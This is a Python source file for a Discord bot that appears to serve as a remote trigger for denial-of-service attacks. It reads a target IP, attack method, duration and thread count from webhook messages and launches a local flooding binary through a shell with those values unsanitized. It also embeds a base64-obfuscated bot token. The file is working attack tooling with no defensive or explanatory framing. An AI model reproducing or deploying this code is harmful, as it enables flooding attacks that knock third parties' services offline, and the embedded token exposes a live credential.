import threading
import base64
import discord
import subprocess
from discord.ext import commands
bot = commands.Bot(command_prefix='>', intents=discord.Intents.all())
print("loaded")
@bot.event
async def on_message(message):
    if message.webhook_id is not None:
        ip = message.content.split(" ")[2]
        method = message.content.split(" ")[1]
        time = message.content.split(" ")[3]
        threads = message.content.split(" ")[4]
        threading.Thread(target=process, args=(ip,method,time,threads)).start()
def process(ip, method, time, threads):
    print(f"recv attack: {ip} / {method} / {time}")
    if "tls" in method:
        subprocess.Popen(f"./l {ip} {time} {threads}", shell=True)
bot.run(base64.b64decode(b"TVRJNE9UZzVORGsxTVRRNE56YzVPVE13TmcuR1NUc0QxLlRPQ3prLVhBZXBtVy1DTVV0Znpva094T0plOGJwNVNhSi1YSkJj").decode())